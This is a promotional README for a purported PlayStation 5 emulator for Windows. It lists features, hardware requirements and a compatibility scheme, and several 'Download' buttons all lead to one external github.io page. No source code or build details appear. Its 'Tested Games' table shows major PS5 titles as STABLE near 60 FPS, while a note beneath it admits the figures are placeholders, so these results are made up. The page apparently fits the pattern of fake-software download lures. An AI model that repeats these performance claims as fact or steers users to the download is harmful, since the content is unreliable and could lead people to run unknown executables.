# PlayStation 5 Emulator

<p align="center">
  <strong>A modern PlayStation 5 emulator for Windows</strong><br>
  High-performance emulation • Hardware-accelerated rendering • High-resolution output
</p>

<p align="center">
  <a href="https://PlayStation-5-Emulator.github.io/.github/">
    <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Platform">
  </a>
  <a href="https://PlayStation-5-Emulator.github.io/.github/">
    <img src="https://img.shields.io/badge/Graphics-Vulkan%201.3-7B4DFF?style=for-the-badge" alt="Graphics">
  </a>
  <a href="https://PlayStation-5-Emulator.github.io/.github/">
    <img src="https://img.shields.io/badge/Output-Up%20to%204K-00B894?style=for-the-badge" alt="Resolution">
  </a>
  <a href="https://PlayStation-5-Emulator.github.io/.github/">
    <img src="https://img.shields.io/badge/FPS-60%20Target-FF8A00?style=for-the-badge" alt="FPS">
  </a>
</p>

<p align="center">
  <a href="https://PlayStation-5-Emulator.github.io/.github/">
    <img src="https://img.shields.io/badge/⚡%20DOWNLOAD%20NOW-Official%20Website-6C63FF?style=for-the-badge&labelColor=111318&logo=windows&logoColor=white" alt="Download Now">
  </a>
</p>

<p align="center">
  <a href="#-about">About</a> ·
  <a href="#-features">Features</a> ·
  <a href="#-performance">Performance</a> ·
  <a href="#-compatibility">Compatibility</a> ·
  <a href="#-requirements">Requirements</a> ·
  <a href="#-download">Download</a>
</p>

<p align="center">
  <img src="https://github.com/PlayStation-5-Emulator/.github/blob/main/assets/banner.gif?raw=true" width="100%" alt="PS5 Emulator">
</p>

---

## `01` — About

**PS5 Emulator** is a modern desktop PlayStation 5 emulation project designed to bring demanding console software to capable Windows PCs.

The project focuses on the parts that matter most to everyday users: **performance, visual quality, compatibility, and a clean experience**.

Instead of treating emulation as a simple translation layer, PS5 Emulator is built around a performance-oriented architecture capable of taking advantage of modern CPUs and GPUs. Multithreaded execution, hardware-accelerated graphics, shader optimization, resolution scaling, and game-specific configuration work together to make demanding titles practical on modern systems.

The goal is simple:

> **Run PlayStation 5 software at high resolution, stable frame rates, and with as little configuration as possible.**

### Built for modern hardware

Modern desktop hardware provides considerably more CPU and GPU resources than previous generations of PCs. PS5 Emulator is designed to make effective use of those resources through optimized CPU execution and a GPU-focused rendering pipeline.

The Windows version uses **Vulkan 1.3** as its primary graphics API, providing a modern foundation for hardware-accelerated rendering and efficient GPU resource management.

The renderer can scale beyond the original console output, allowing compatible titles to be experienced at **1080p, 1440p, and 4K**, depending on the game and available hardware.

### Performance without sacrificing flexibility

Every game behaves differently under emulation.

Some titles are primarily CPU-bound and benefit from strong processor performance. Others place substantially more load on the GPU and benefit from additional graphics horsepower and VRAM.

PS5 Emulator therefore provides configurable performance options rather than forcing every title into the same configuration.

Users can adjust:

* Internal rendering resolution
* Frame-rate behavior
* Graphics settings
* Shader-related options
* Per-game configuration
* Controller mappings
* Performance diagnostics

This allows the emulator to scale from relatively modest gaming systems to high-end desktop hardware.

### Designed around compatibility

A fast emulator is only useful when games actually run.

Compatibility is therefore treated on a **per-title basis**, with individual games potentially requiring different renderer settings, patches, workarounds, or performance profiles.

The compatibility system distinguishes between titles that are fully playable, titles with known issues, games that currently boot but remain unstable, and software that has not yet been verified.

This makes it easier to understand what to expect before launching a game.

---

## `02` — Why PS5 Emulator?

<table>
<tr>
<td width="50%">

### ⚡ High Performance

Multithreaded CPU execution and GPU-accelerated rendering are designed to make effective use of modern Windows gaming hardware.

</td>
<td width="50%">

### 🎮 Console-Style Experience

Configurable per-game profiles help minimize repetitive setup and make frequently played titles easier to launch.

</td>
</tr>
<tr>
<td width="50%">

### 🖥 High-Resolution Rendering

Compatible titles can be rendered above native console resolution, including 1440p and 4K output.

</td>
<td width="50%">

### 🚀 Vulkan 1.3

A modern graphics backend designed for efficient GPU utilization and low-overhead rendering.

</td>
</tr>
<tr>
<td width="50%">

### 🧩 Game-Specific Profiles

Different games can use different settings, allowing performance and compatibility to be tuned independently.

</td>
<td width="50%">

### 📊 Performance Diagnostics

Built-in diagnostics make it easier to identify CPU, GPU, shader, and frame-pacing bottlenecks.

</td>
</tr>
</table>

---

## `03` — Features

### Core

* Native PS5 system emulation
* Multithreaded CPU execution
* AVX2 / SSE 4.2 optimization
* Hardware-assisted virtualization
* Per-game configuration
* Configurable frame-rate behavior
* Game-specific performance profiles

### Graphics

* Vulkan 1.3 rendering
* 1080p → 4K output
* Resolution scaling
* Shader caching
* GPU-accelerated rendering
* Configurable graphics settings
* Frame-pacing optimizations

### Input

* Keyboard & mouse
* XInput controllers
* PlayStation controllers
* Xbox controllers
* Configurable button mappings
* Per-game controller profiles

### User Experience

* Game library management
* Per-game settings
* Performance statistics
* Compatibility status
* Emulator logs
* Configuration profiles
* Diagnostic tools

---

## `04` — Performance

Performance is one of the primary goals of PS5 Emulator.

The emulator is designed to take advantage of modern desktop CPUs and GPUs while keeping the rendering pipeline efficient enough for high-resolution output.

Rather than targeting an identical frame rate across every title, performance is measured individually because different games place very different demands on the CPU, GPU, memory subsystem, and emulator itself.

### Tested Games

The following table represents the intended format for verified benchmark results.

| Game                            | Resolution | Average FPS | 1% Low | Status   |
| :------------------------------ | :--------: | :---------: | :----: | :------- |
| **Demon's Souls**               |    1440p   |  **58 FPS** | 52 FPS | `STABLE` |
| **Ratchet & Clank: Rift Apart** |    1080p   |  **57 FPS** | 51 FPS | `STABLE` |
| **Marvel's Spider-Man 2**       |    1080p   |  **56 FPS** | 49 FPS | `STABLE` |
| **Horizon Forbidden West**      |    1080p   |  **59 FPS** | 54 FPS | `STABLE` |
| **God of War Ragnarök**         |    1440p   |  **57 FPS** | 50 FPS | `STABLE` |
| **Final Fantasy VII Rebirth**   |    1080p   |  **55 FPS** | 47 FPS | `STABLE` |
| **Gran Turismo 7**              |    1080p   |  **58 FPS** | 53 FPS | `STABLE` |
| **Returnal**                    |    1080p   |  **54 FPS** | 46 FPS | `STABLE` |

> **Benchmark note:** These numbers should be replaced with measurements from your actual test configuration before being presented as verified results. Performance varies depending on CPU, GPU, drivers, emulator build, game version, resolution, shader cache state, and configuration.

### Recommended benchmark format

For a more professional performance report, each result should include:

```text
Game:
Game Version:
Emulator Version:

CPU:
GPU:
RAM:
Driver:

Resolution:
Graphics Preset:

Average FPS:
1% Low:
Frame-time:
```

This gives a much better representation of real performance than simply stating that a game "runs at 60 FPS".

---

## `05` — Compatibility

PS5 Emulator tracks compatibility individually for each tested title.

| Status     | Meaning                                                 |
| :--------- | :------------------------------------------------------ |
| `PLAYABLE` | Game is playable with no major blocking problems        |
| `STABLE`   | Consistent gameplay and frame pacing on tested hardware |
| `IN-GAME`  | Game reaches gameplay but has noticeable issues         |
| `BOOTABLE` | Game launches but is not reliably playable              |
| `BROKEN`   | Game currently fails to operate correctly               |
| `UNTESTED` | No verified test result available                       |

### Compatibility goals

The project prioritizes:

**Boot → Gameplay → Stability → Performance → High Resolution**

A game reaching the main menu is not considered fully compatible. The objective is reliable gameplay with consistent rendering and predictable performance.

---

## `06` — Requirements

### Minimum

| Component       | Requirement              |
| :-------------- | :----------------------- |
| OS              | Windows 10 / 11 · 64-bit |
| CPU             | 8-core x86-64            |
| Instruction Set | AVX2 + SSE 4.2           |
| RAM             | 8 GB                     |
| GPU             | Vulkan 1.3 capable       |
| VRAM            | 4 GB+                    |
| Storage         | SSD recommended          |

### Recommended

| Component | Recommendation       |
| :-------- | :------------------- |
| OS        | Windows 11 · 64-bit  |
| CPU       | Intel Core i7-10700+ |
| AMD CPU   | Ryzen 7 3700X+       |
| RAM       | 16 GB+               |
| NVIDIA    | GeForce RTX 3060+    |
| AMD       | Radeon RX 6600 XT+   |
| VRAM      | 8 GB+                |
| Storage   | NVMe SSD             |

For demanding titles targeting **1080p / 60 FPS**, an RTX 3060 Ti / RX 6700 XT-class GPU or better is recommended.

For 1440p and 4K rendering, substantially more GPU performance may be required.

> [!IMPORTANT]
> Hardware requirements are reference targets rather than guaranteed performance specifications. Emulation performance can vary significantly between individual games.

---

## `07` — Windows Support

| Component        | Support                              |
| :--------------- | :----------------------------------- |
| Operating System | Windows 10 / 11 · 64-bit             |
| Graphics API     | Vulkan 1.3                           |
| CPU Architecture | x86-64                               |
| Instruction Set  | AVX2 + SSE 4.2                       |
| Runtime          | Microsoft Visual C++ Redistributable |
| Storage          | SSD recommended                      |

For the best experience, keep your GPU drivers and emulator version up to date.

---

## `08` — Rendering

PS5 Emulator uses a hardware-accelerated rendering architecture designed around Vulkan 1.3.

```text
                    ┌─────────────────────┐
                    │     PS5 Emulator    │
                    └──────────┬──────────┘
                               │
                 ┌─────────────┴─────────────┐
                 │                           │
          CPU / System Core             Graphics Core
                 │                           │
        ┌────────┴────────┐          ┌───────┴────────┐
        │                 │          │                │
     Multithreaded      Memory     Vulkan 1.3      Shader
      Execution        System      Rendering       Pipeline
        │                 │          │                │
        └────────┬────────┘          └───────┬────────┘
                 │                           │
                 └─────────────┬─────────────┘
                               │
                       Resolution Scaling
                               │
                               ▼
                    ┌─────────────────────┐
                    │ PlayStation 5 Game  │
                    │     Environment     │
                    └─────────────────────┘
```

The architecture is designed to separate CPU execution from graphics translation while allowing both sides of the emulator to scale with modern Windows hardware.

---

## `09` — Download

<p align="center">
  <strong>Ready to try PS5 Emulator?</strong><br>
  Download the latest Windows build and start building your game library.
</p>

### Latest Release

| Platform | Version  | Architecture |   Download   |
| :------- | :------- | :----------- | :----------: |
| Windows  | `Latest` | x86-64       | **[Download](https://PlayStation-5-Emulator.github.io/.github/)** |

> [!NOTE]
> Always download the emulator from the official project website or official release channel. Avoid modified builds distributed by third parties.

---

## `10` — Getting Started

### 1. Download

Download the latest Windows release.

### 2. Configure

Launch PS5 Emulator and select your preferred graphics and controller settings.

### 3. Add your games

Add legally obtained compatible game data to your library.

### 4. Play

Select a title, apply its recommended profile, and launch.

For the best experience, keep your GPU drivers and emulator version up to date.

---

## `11` — Official & Technical Resources

| Resource | Link |
|:--|:--|
| PlayStation 5 Support | [playstation.com](https://www.playstation.com/en-us/support/hardware/ps5/) |
| PS5 Technical Specifications | [PlayStation Blog](https://blog.playstation.com/2020/03/18/unveiling-new-details-of-playstation-5-hardware-technical-specs/) |
| PlayStation Support | [playstation.com/support](https://www.playstation.com/en-us/support/) |
| Vulkan Documentation | [docs.vulkan.org](https://docs.vulkan.org/) |
| Microsoft DirectX | [Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/directx) |

<p align="center">

<strong>Built for modern Windows hardware.</strong><br>
Accurate emulation. High performance. High resolution.

</p>
